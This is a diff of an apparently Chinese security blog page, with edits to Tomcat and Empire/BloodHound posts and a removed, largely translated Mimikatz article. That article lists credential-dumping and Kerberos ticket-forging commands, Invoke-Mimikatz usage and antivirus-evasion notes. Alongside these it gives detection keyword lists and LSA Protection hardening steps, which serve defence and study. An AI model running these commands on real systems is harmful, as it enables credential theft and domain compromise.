+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/SadProcessor/EmpireDog" target="_blank" rel="noopener">https://github.com/SadProcessor/EmpireDog</a></p>
+<p><a href="https://github.com/EmpireProject" target="_blank" rel="noopener">https://github.com/EmpireProject</a></p>
+<p><a href="https://github.com/EmpireProject/Empire/wiki" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/wiki</a></p>
+<p><a href="https://adaptiveempire.slack.com" target="_blank" rel="noopener">https://adaptiveempire.slack.com</a></p>
+<p><a href="https://gitlab.com/carlos_perez/PowerEmpire" target="_blank" rel="noopener">https://gitlab.com/carlos_perez/PowerEmpire</a></p>
+<p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p>
+<p><a href="https://github.com/BloodHoundAD/BloodHound/wiki" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound/wiki</a></p>
+<p><a href="https://bloodhoundhq.slack.com" target="_blank" rel="noopener">https://bloodhoundhq.slack.com</a></p>
+<p><a href="https://blog.cptjesus.com/posts/introtocypher" target="_blank" rel="noopener">https://blog.cptjesus.com/posts/introtocypher</a></p>
+<p><a href="https://posts.specterops.io/" target="_blank" rel="noopener">https://posts.specterops.io/</a></p>
+<p><a href="http://porterhau5.com/blog/" target="_blank" rel="noopener">http://porterhau5.com/blog/</a></p>
+<p><a href="https://adsecurity.org/" target="_blank" rel="noopener">https://adsecurity.org/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
     <article id="post-Drupal远程代码执行漏洞(CVE-2018-7600)"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="article-inner">
     
@@ -878,8 +1260,8 @@
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Tomcat-系列漏洞利用与安全加固"><a href="#Tomcat-系列漏洞利用与安全加固" class="headerlink" title="Tomcat 系列漏洞利用与安全加固"></a>Tomcat 系列漏洞利用与安全加固</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
-<p>由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p>
+        <h1 id="Tomcat-系列漏洞利用与安全加固"><a href="#Tomcat-系列漏洞利用与安全加固" class="headerlink" title="Tomcat 系列漏洞利用与安全加固"></a>Tomcat 系列漏洞利用与安全加固</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​    Tomcat 是由 Apache 开发的一个 Servlet 容器，实现了对 Servlet 和 JSP 的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。</p>
+<p>​    由于 Tomcat 本身也内含了一个 HTTP 服务器，它也可以被视作一个单独的 Web 服务器。但是，不能将 Tomcat 和 Apache HTTP 服务器混淆，Apache HTTP 服务器是一个用 C 语言实现的 HTTP Web 服务器；这两个 HTTP web server 不是捆绑在一起的。Tomcat 包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</p>
 <h3 id="Tomcat-重要目录"><a href="#Tomcat-重要目录" class="headerlink" title="Tomcat 重要目录"></a>Tomcat 重要目录</h3><ul>
 <li><strong>/bin</strong> - Tomcat 脚本存放目录（如启动、关闭脚本）。 <code>*.sh</code> 文件用于 Unix 系统； <code>*.bat</code> 文件用于 Windows 系统。</li>
 <li><strong>/conf</strong> - Tomcat 配置文件目录。</li>
@@ -1012,810 +1394,6 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web应用安全/">Web应用安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Mimikatz"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2018/01/13/Mimikatz/">Mimikatz</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2018/01/13/Mimikatz/" class="article-date">
-	  <time datetime="2018-01-13T15:53:56.000Z" itemprop="datePublished">2018-01-13</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><ul>
-<li>cls—————————–清屏</li>
-<li>exit—————————-退出</li>
-<li>version————查看mimikatz的版本</li>
-<li>system::user—–查看当前登录的系统用户</li>
-<li>system::computer——-查看计算机名称</li>
-<li>process::list——————列出进程</li>
-<li>process::suspend 进程名称 —–暂停进程</li>
-<li>process::stop 进程名称———结束进程</li>
-<li>process::modules –列出系统的核心模块及所在位置</li>
-<li>service::list—————列出系统的服务</li>
-<li>service::remove———–移除系统的服务</li>
-<li>service::start stop 服务名称–启动或停止服务</li>
-<li>privilege::list—————列出权限列表</li>
-<li>privilege::enable——–激活一个或多个权限</li>
-<li>privilege::debug—————–提升权限</li>
-<li>nogpo::cmd————打开系统的cmd.exe</li>
-<li>nogpo::regedit ———–打开系统的注册表</li>
-<li>nogpo::taskmgr————-打开任务管理器</li>
-<li>ts::sessions—————–显示当前的会话</li>
-<li>ts::processes——显示进程和对应的pid情况等</li>
-<li>sekurlsa::wdigest—–获取本地用户信息及密码</li>
-<li>sekurlsa::tspkg——获取tspkg用户信息及密码</li>
-<li>sekurlsa::logonPasswords–获登陆用户信息及密码</li>
-</ul>
-<p><strong>翻译来自</strong>：<a href="https://adsecurity.org/?page_id=1821" target="_blank" rel="noopener">https://adsecurity.org/?page_id=1821</a></p>
-<h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-LoadScreen-211-2017-11-28.png" alt="img"></h5><h3 id="Mimikatz概述："><a href="#Mimikatz概述：" class="headerlink" title="Mimikatz概述："></a><strong>Mimikatz概述：</strong></h3><p>Mimikatz是从Windows系统收集凭据数据的最佳工具之一。事实上，我认为Mimikatz是Windows凭证的“瑞士军刀”（或多工具） - 这是一个可以做任何事情的工具。由于Mimikatz，Benjamin Delpy的作者是法语，大多数描述Mimikatz使用的资源都是法语，至少在<a href="http://blog.gentilkiwi.com/" target="_blank" rel="noopener">他的博客上</a>。该<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz GitHub的库</a>是英文的，包括命令使用的有用信息。</p>
-<p><strong>Mimikatz</strong>是一个Windows x32 / x64程序，由Benjamin Delpy（@gentilkiwi）于2007年编写，用于了解有关Windows凭据（以及作为概念证明）的更多信息。有两个可选组件提供附加功能，<em>mimidrv</em>（与Windows内核交互的驱动程序）和<em>mimilib</em>（AppLocker旁路，Auth软件包/ SSP，密码过滤器和WinDBG的sekurlsa）。Mimikatz需要管理员或SYSTEM并经常debug权限以执行某些操作并与LSASS进程交互（取决于所请求的操作）。Mimikatz.exe包含或至少应包含其中指出的所有功能。</p>
-<p>Mimikatz功能可以通过<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">编译和运行您自己的版本</a>，运行<a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz可执行文件</a>，利用<a href="https://www.offensive-security.com/metasploit-unleashed/mimikatz/" target="_blank" rel="noopener">MetaSploit脚本</a>，<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">官方Invoke-Mimikatz PowerShell版本</a>或十几种Mimikatz PowerShell变体（我碰巧偏向<a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">PowerShell Empire</a>，因为帝国很棒！）。</p>
-<p>Mimikatz源代码和发布二进制文件可在GitHub上获得，并在Creative Commons下获得许可，具有以下细节：<br><em>您可以自由地：</em><br><strong>共享 - 以任何媒体或格式复制和重新分发材料*</strong></p>
-<p>适应 - 重新混合，转换和构建材料<em><br>**用于任何目的，甚至商业用途。</em><br><em>只要您遵守许可条款，许可人就不能撤销这些自由。</em><br><em>归因 - 您必须提供适当的信用，提供许可证的链接，并指出是否进行了更改。您可以以任何合理的方式这样做，但不得以任何方式表明许可人认可您或您的使用。</em><br><em>没有其他限制 - 您可能不会使用法律条款或技术措施来合法地限制他人做许可证所允许的任何事情。</em></p>
-<h4 id="Mimikatz作者："><a href="#Mimikatz作者：" class="headerlink" title="Mimikatz作者："></a><strong>Mimikatz作者：</strong></h4><ul>
-<li>Benjamin DELPY <code>gentilkiwi</code>，你可以在推特上联系他（@gentilkiwi）或者通过邮件联系他（benjamin [at] gentilkiwi.com）</li>
-<li><code>lsadump</code>模块中的DCSync功能与Vincent LE TOUX共同编写，您通过邮件联系他（vincent.letoux [at] gmail.com）或访问他的网站（<a href="http://www.mysmartlogon.com/" target="_blank" rel="noopener">http://www.mysmartlogon.com</a>）</li>
-</ul>
-<h4 id="“官方”Mimikatz链接："><a href="#“官方”Mimikatz链接：" class="headerlink" title="“官方”Mimikatz链接："></a><strong>“官方”Mimikatz链接：</strong></h4><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz GitHub位置</a>（源代码）</p>
-<p><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz发布</a>（包括二进制文件）</p>
-<p><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="noopener">Mimikatz GitHub Wiki</a>（文档，其中一些在此处转载）</p>
-<p><a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="noopener">GentilKiwi Blog</a>（大部分是法语，使用Chrome / other进行翻译）</p>
-<h3 id="Mimikatz＆Credentials："><a href="#Mimikatz＆Credentials：" class="headerlink" title="Mimikatz＆Credentials："></a><strong>Mimikatz＆Credentials：</strong></h3><p>​    用户登录后，会生成各种凭据并将其存储在内存中的本地安全机构子系统服务<a href="http://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service" target="_blank" rel="noopener">LSASS</a>中。这是为了便于单点登录（SSO），确保每次请求资源访问时都不会提示用户。凭证数据可能包括Kerberos票证，NTLM密码哈希值，LM密码哈希值（如果密码&lt;15个字符，具体取决于Windows操作系统版本和补丁级别），甚至是明文密码（以支持WDigest和SSP身份验证等）。</p>
-<p>​    虽然可以<a href="http://support.microsoft.com/kb/299656" target="_blank" rel="noopener">阻止Windows计算机</a>在本地计算机SAM数据库（和AD数据库）中<a href="http://support.microsoft.com/kb/299656" target="_blank" rel="noopener">创建LM哈希</a>，但这不会阻止系统在内存中生成LM哈希。<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">默认情况下，</a>除非明确启用，否则<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">Windows Server 2008和Windows Vista不再</a>为用户<a href="https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx" target="_blank" rel="noopener">生成LM哈希值</a>。从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再在内存中。<a href="https://adsecurity.org/?p=559" target="_blank" rel="noopener">此功能也在kb2871997中“反向移植”到早期版本的Windows（Windows 7/8 / 2008R2 / 2012）</a>，但为了防止将“明文”密码放入LSASS，以下注册表项需要设置为“0”（摘要已禁用）：</p>
-<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/WDIGEST-RegistryKey-UseLogonCredential-1.jpg" alt="WDIGEST-的RegistryKey-UseLogonCredential-1"></a></p>
-<p>此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为1以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2。Windows 8.1 / 2012 R2及更新版本没有“UseLogonCredential”DWORD值，因此必须创建它。在这些系统上存在此密钥可能表明存在问题。</p>
-<p>请注意，攻击者很少需要直接在目标系统上运行代码，因此Mimikatz会不断更新，以便远程运行新功能。这包括远程系统对远程系统运行Mimikatz以转储凭据，使用PowerShell远程处理远程使用<strong>Invoke-Mimikatz</strong>，以及<a href="https://adsecurity.org/?page_id=1821#DCSync" target="_blank" rel="noopener">DCSync</a>，这是在没有运行任何Mimikatz代码的情况下远程访问域中任何Active Directory帐户的密码数据的最新功能在DC（<a href="https://adsecurity.org/?p=1729" target="_blank" rel="noopener">它使用Microsoft的域控制器官方复制API，一旦获得正确的权限</a>）。</p>
-<h3 id="OS提供的可用凭据："><a href="#OS提供的可用凭据：" class="headerlink" title="OS提供的可用凭据："></a><strong>OS提供的可用凭据：</strong></h3><p>Benjamin Delpy在OneDrive上发布了一个Excel图表（不再可用，但如下所示），显示内存中可用的凭证数据类型（LSASS），包括Windows 8.1和Windows 2012 R2，它们具有增强的保护机制，减少了数量和类型凭证保存在内存中。<em>（点击图片来embiggen）</em></p>
-<p><img src="http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png" alt=""></p>
-<h3 id="PowerShell和Mimikatz："><a href="#PowerShell和Mimikatz：" class="headerlink" title="PowerShell和Mimikatz："></a><strong>PowerShell和Mimikatz：</strong></h3><p>大多数Mimikatz功能都可以在<a href="https://github.com/mattifestation/PowerSploit" target="_blank" rel="noopener">PowerSploit</a>（PowerShell Post-Exploitation Framework）中通过“ <a href="https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">Invoke-Mimikatz</a>”PowerShell脚本（由<a href="https://twitter.com/JosephBialek" target="_blank" rel="noopener">Joseph Bialek</a>编写）获得，脚本“leverages Mimikatz 2.0和Invoke-ReflectivePEInjection反射性地将Mimikatz完全加载到内存中。这允许您在不将Mimikatz二进制文件写入磁盘的情况下执行诸如转储凭证之类的操作。“请注意，PowerSploit框架现在托管在<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">”PowerShellMafia“GitHub存储库中</a>。</p>
-<p>Invoke-Mimikatz的“神奇”之处在于能够将Mimikatz DLL（嵌入在脚本中）反射加载到内存中。Invoke-Mimikatz代码可以从Internet（或Intranet服务器）下载，并且可以从内存中执行而无需接触任何磁盘。此外，如果使用适当的权限运行Invoke-Mimikatz并且目标计算机启用了PowerShell远程处理，它可以从其他系统提取凭据，以及远程执行标准Mimikatz命令，而不会在远程系统上删除文件。</p>
-<p>当Mimikatz出现时，Invoke-Mimikatz不会更新，尽管它可以（手动）。可以用新的DLL编码元素（32位和64位版本）替换掉。Will Schroeder（<a href="https://twitter.com/harmj0y" target="_blank" rel="noopener">@ HarmJ0y）</a>有<a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/" target="_blank" rel="noopener">关于在Invoke-Mimikatz中更新Mimikatz DLL的信息</a>（这不是一个非常复杂的过程）。该<a href="https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">调用-Mimikatz的PowerShell的帝国版本</a>通常保持最新。</p>
-<ul>
-<li>使用mimikatz从LSASS转储凭证：  <em>Invoke-Mimikatz -DumpCreds</em></li>
-<li>使用mimikatz导出所有私有证书（即使它们被标记为不可导出）：<em>Invoke-Mimikatz -</em> DumpCerts</li>
-<li>提升权限以在远程计算机上拥有debug权限：<em>Invoke-Mimikatz -Command“privilege::debug exit”-ComputerName“computer1”</em></li>
-</ul>
-<p>Invoke-Mimikatz“Command”参数使Invoke-Mimikatz能够运行自定义Mimikatz命令。</p>
-<p>​        </p>
-<h3 id="检测Mimikatz："><a href="#检测Mimikatz：" class="headerlink" title="检测Mimikatz："></a><strong>检测Mimikatz：</strong></h3><p>有几种方法可以在网络上检测Mimikatz的使用，但没有一种方法可以保证。由于Mimikatz的源代码在<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">GitHub上</a>，任何使用Visual Studio的人都可以编译自己的版本。我用“kitikatz”替换了所有“mimikatz”的实例，建立了我自己的Mimikatz版本，名为“kitikatz”，而VirusTotal的检测率并不好（4/54）。我的Windows 10系统上的Windows Defender检测到它。然后我用相同的单词替换了“Benjamin Delpy”和“gentilkiwi”，只用3代替e和i代替。检出率<a href="https://www.virustotal.com/en/file/84b6cd8ccaa60a89c1375bec5044e6240d8a2db3f19fecd763749fa9a530470b/analysis/1449967355/" target="_blank" rel="noopener">仍然很差（4/54）</a>。我的Windows 10系统上的Windows Defender没有检测到它。因此，您的里程数会因检测而异。虽然<a href="http://blog.virustotal.com/2012/08/av-comparative-analyses-marketing-and.html" target="_blank" rel="noopener">VirusTotal不是确定AV检测的最佳方法</a>，获得一些基本数字是一种相对简单的方法。</p>
-<ul>
-<li>Benjamin Delpy 在<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimkatz GitHub存储库</a>上发布了Mimikatz的<a href="https://plusvic.github.io/yara/" target="_blank" rel="noopener">YARA规则</a>。</li>
-<li>使用最新的定义文件运行AntiVirus软件。据<a href="https://www.virustotal.com/en/" target="_blank" rel="noopener">VirusTotal称</a>，<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">35/35的AV引擎</a>检测到<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">日期为11/11/2015</a>（32位和64位）的<a href="https://www.virustotal.com/en/file/843b2c2e7a631c393a2763dd03d02166cee0631c07d10dae0a2e6a5816280dd8/analysis/" target="_blank" rel="noopener">mimikatz.exe</a>。重命名文件不会更改扫描结果。请注意，本杰明已经注意到现实世界的结果<a href="https://twitter.com/gentilkiwi/status/658344484615421954" target="_blank" rel="noopener">不太成功</a>。但是，AV通常会标记已知的坏文件。AntiVirus是基础安全的一部分 - “深度防御”的第一层。</li>
-<li>Mimikatz（截至10月）<a href="http://blog.cobaltstrike.com/2015/11/11/revolutionary-device-detects-mimikatz-use/" target="_blank" rel="noopener">激活附属的BusyLights</a>。<em>[在Mimikatz版本2.0 alpha 20151008（oe.eo）版本中实施]</em></li>
-<li>利用安全软件识别与LSASS交互的进程。监控过程注入的安全软件也可以定期检测Mimikatz的使用情况。</li>
-<li><a href="https://isc.sans.edu/diary/Detecting+Mimikatz+Use+On+Your+Network/19311" target="_blank" rel="noopener">HoneyTokens / HoneyHashes</a>涉及在企业中的许多计算机<a href="https://isc.sans.edu/diary/Detecting+Mimikatz+Use+On+Your+Network/19311" target="_blank" rel="noopener">上将</a>特殊凭证存储在内存中。标记了这些凭据，因此当有人尝试使用它们时，会发出严重警报。这需要某种推送方法以及放置对攻击者有吸引力的凭据。从理论上讲，这可以检测证书被盗和在环境中的使用。</li>
-<li>如果企业中的WDIGEST注册表项（HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ SecurityProviders \ WDigest）应设置为“0”，以防止“明文”密码存储在LSASS中，并且系统中存在切换到“1”，这可能表示凭证盗窃活动。此注册表项值得在您的环境中进行监控，因为攻击者可能希望将其设置为0以启用摘要密码支持，这会强制将“明文”密码放在任何版本的Windows上的LSASS中，从Windows 7 / 2008R2到Windows 10 / 2012R2（可能还有2016年）。</li>
-<li><a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">我在2015年初发布的此页面上介绍了伪造的Kerberos票证检测。这些方法可以检测金票，银票和信任票</a>。我还有关于<a href="https://adsecurity.org/?p=763" target="_blank" rel="noopener">如何检测MS14-068 Kerberos漏洞利用的信息</a>。</li>
-<li>在支持它的企业中的所有Windows版本上启用LSA Protection。这可以防止Mimikatz“开箱即用”，并且需要使用Mimikatz驱动程序，该驱动程序在与LSASS交互时记录事件。</li>
-<li><a href="https://technet.microsoft.com/en-us/library/mt431757%28v=vs.85%29.aspx" target="_blank" rel="noopener">从Windows 10和Windows Server 2016开始</a>有<a href="https://technet.microsoft.com/en-us/library/mt431757%28v=vs.85%29.aspx" target="_blank" rel="noopener">新的/更新的事件</a>，可能会检测到Mimikatz的使用：</li>
-</ul>
-<blockquote>
-<p><strong>向LSASS.exe添加了默认进程SACL</strong><br>在Windows 10中，将一个默认进程SACL添加到LSASS.exe以记录尝试访问LSASS.exe的进程。SACL是L“S :( AU; SAFA; 0x0010 ;;; WD）”。您可以在高级审核策略配置\对象访问\审核内核对象下启用此功能。<br>这有助于识别从进程内存中窃取凭据的攻击。</p>
-</blockquote>
-<h4 id="Mimikatz＆LSA保护："><a href="#Mimikatz＆LSA保护：" class="headerlink" title="Mimikatz＆LSA保护："></a>Mimikatz＆LSA保护：</h4><p>Windows Server 2012 R2和Windows 8.1包含一项名为LSA Protection的新功能，该功能涉及<a href="https://technet.microsoft.com/en-us/library/dn408187.aspx" target="_blank" rel="noopener">在Windows Server 2012 R2上</a>启用<a href="https://technet.microsoft.com/en-us/library/dn408187.aspx" target="_blank" rel="noopener">LSASS作为受保护进程</a>（Mimikatz可以绕过驱动程序，但这会在事件日志中产生一些噪音）：</p>
-<p><em>LSA（包括本地安全机构服务器服务（LSASS）进程）验证用户是否进行本地和远程登录，并实施本地安全策略。Windows 8.1操作系统为LSA提供额外保护，以防止未受保护的进程读取内存和代码注入。这为LSA存储和管理的凭据提供了额外的安全性。</em></p>
-<p>启用LSA保护：</p>
-<ol>
-<li>打开注册表编辑器（RegEdit.exe），然后导航到位于以下位置的注册表项：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa  并将注册表项的值设置为：“RunAsPPL”=dword:00000001。</li>
-<li>创建新GPO并浏览到“计算机配置”，“首选项”，“Windows设置”。右键单击“注册表”，指向“新建”，然后单击“注册表项”。将出现“新建注册表属性”对话框。在Hive列表中，单击HKEY_LOCAL_MACHINE。在“密钥路径”列表中，浏览到SYSTEM\CurrentControlSet\Control\Lsa.。在“值名称”框中，键入RunAsPPL。在“值类型”框中，单击“REG_DWORD”。在“数值数据”框中，键入00000001.单击“确定”。</li>
-</ol>
-<p>LSA Protection可防止未受保护的进程与LSASS交互。Mimikatz仍然可以通过驱动程序（“！+”）绕过它。</p>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Driver-Remove-LSASS-Protection.jpg" alt="Mimikatz驱动器 - 删除 -  LSASS保护"></a></p>
-<h3 id="检测Invoke-Mimikatz："><a href="#检测Invoke-Mimikatz：" class="headerlink" title="检测Invoke-Mimikatz："></a><strong>检测Invoke-Mimikatz：</strong></h3><ul>
-<li>确保所有Windows系统都具有PowerShell v3或更高版本。较新版本的PowerShell具有更好的日志记录功能，尤其是PowerShell v5。</li>
-<li>通过组策略启用PowerShell模块日志记录：计算机配置，策略，管理模板，Windows组件和Windows PowerShell，打开模块日志记录。输入“*”并单击“确定”。这将记录所有PowerShell活动，包括所有PowerShell模块。</li>
-</ul>
-<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/PowerShellModuleLogging-All.jpg" alt="PowerShellModuleLogging，所有"></a></p>
-<ul>
-<li>PowerShell活动将记录到PowerShell操作日志中。将这些事件推送或拉到中央日志记录服务器（通过<a href="http://blogs.technet.com/b/wincat/archive/2008/08/11/quick-and-dirty-large-scale-eventing-for-windows.aspx" target="_blank" rel="noopener">Windows事件转发或类似方法</a>）或SIEM。</li>
-<li>解析以下内容的PowerShell事件：<ul>
-<li>“System.Reflection.AssemblyName”</li>
-<li>“System.Reflection.Emit.AssemblyBuilderAccess”</li>
-<li>“System.Runtime.InteropServices.MarshalAsAttribute”</li>
-<li>“TOKEN_PRIVILEGES”</li>
-<li>“SE_PRIVILEGE_ENABLED”</li>
-</ul>
-</li>
-</ul>
-<p><em>注意：虽然可以通过警告“mimikatz”，“Delpy”或“gentilkiwi”来识别Mimikatz的使用情况，但“复杂”的攻击者可能会在没有这些关键字的情况下推出他们自己的Mimikatz或Invoke-Mimikatz版本。</em></p>
-<h4 id="检测攻击性PowerShell工具："><a href="#检测攻击性PowerShell工具：" class="headerlink" title="检测攻击性PowerShell工具："></a>检测攻击性PowerShell工具：</h4><p>许多PowerShell攻击性工具使用以下在PowerShell模块日志记录中记录的调用。</p>
-<ul>
-<li>“GetDelegateForFunctionPointer”</li>
-<li>“System.Reflection.AssemblyName”</li>
-<li>“System.Reflection.Emit.AssemblyBuilderAccess”</li>
-<li>“System.Management.Automation.WindowsErrorReporting”</li>
-<li>“MiniDumpWriteDump”</li>
-<li>“TOKEN_IMPERSONATE”</li>
-<li>“TOKEN_DUPLICATE”</li>
-<li>“TOKEN_ADJUST_PRIVILEGES”</li>
-<li>“TOKEN_PRIVILEGES”</li>
-</ul>
-<h3 id="“Sneaky”的Mimikatz执行："><a href="#“Sneaky”的Mimikatz执行：" class="headerlink" title="“Sneaky”的Mimikatz执行："></a><strong>“</strong>Sneaky<strong>”的Mimikatz执行：</strong></h3><p>凯西·史密斯（<a href="https://twitter.com/subTee" target="_blank" rel="noopener">@subtee</a>＆<a href="http://subt0x10.blogspot.com/" target="_blank" rel="noopener">blog</a>）已经做了很多工作，展示了<a href="http://subt0x10.blogspot.com/2015/11/your-whitelisting-application-has-no.html" target="_blank" rel="noopener">应用程序白名单不是许多人认为的灵丹妙药</a>。尽管如此，应用程序白名单是深度防御战略中的一个坚实层面。<br>凯西还提出了许多创造性和偷偷摸摸的方式来执行Mimikatz。</p>
-<ul>
-<li>在RegSvcs或RegAsm内部执行Mimikatz - .NET实用程序概念验证</li>
-<li><a href="http://subt0x10.blogspot.com/2015/09/simple-example-of-encoded-mimikatz-upx.html" target="_blank" rel="noopener">Mimikatz打包并隐藏在图像文件中</a></li>
-<li>从GitHub下载并执行Mimikatz In Memory</li>
-</ul>
-<p>注意：Subtee已经停止使用他的GitHub仓库，因此这些链接不再有效并且已被删除。</p>
-<h3 id="最受欢迎的Mimikatz命令："><a href="#最受欢迎的Mimikatz命令：" class="headerlink" title="最受欢迎的Mimikatz命令："></a><strong>最受欢迎的Mimikatz命令：</strong></h3><p>以下是一些最受欢迎的Mimikatz命令和相关功能。</p>
-<ul>
-<li><a href="https://adsecurity.org/?page_id=1821#CRYPTOCertificates" target="_blank" rel="noopener">CRYPTO::Certificates</a> - 列出/出口证书</li>
-<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSGolden" target="_blank" rel="noopener">KERBEROS::Golden</a> - 制作金/银/信托票（ golden/silver/trust tickets）</li>
-<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSList" target="_blank" rel="noopener">KERBEROS::List</a> - 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSPTT" target="_blank" rel="noopener">KERBEROS::PTT</a> - 通过门票。通常用于注入被盗或伪造的Kerberos票（金/银/信托）。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPDCSync" target="_blank" rel="noopener">LSADUMP::DCSync</a> - 要求DC同步对象（获取帐户的密码数据）。无需在DC上运行代码。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPLSA" target="_blank" rel="noopener">LSADUMP::LSA</a> - 要求LSA Server检索SAM / AD企业（正常，动态补丁或注入）。用于从域控制器或lsass.dmp转储文件转储所有Active Directory域凭据。还用于获取特定的帐户凭据，例如krbtgt和参数/ name：“/ name：krbtgt”</li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPSAM" target="_blank" rel="noopener">LSADUMP::SAM</a> - 获取SysKey来解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。这用于转储Windows计算机上的所有本地凭据。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPTrust" target="_blank" rel="noopener">LSADUMP::Trust</a> - 要求LSA Server检索Trust Auth信息（正常或动态补丁）。转储所有关联信任（域/林）的信任密钥（密码）。</li>
-<li><a href="https://adsecurity.org/?page_id=1821#MISCAddSid" target="_blank" rel="noopener">MISC::AddSid</a> - 将SIDHistory添加到用户帐户。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。已移至SID：自2016年5月6日起修改。</li>
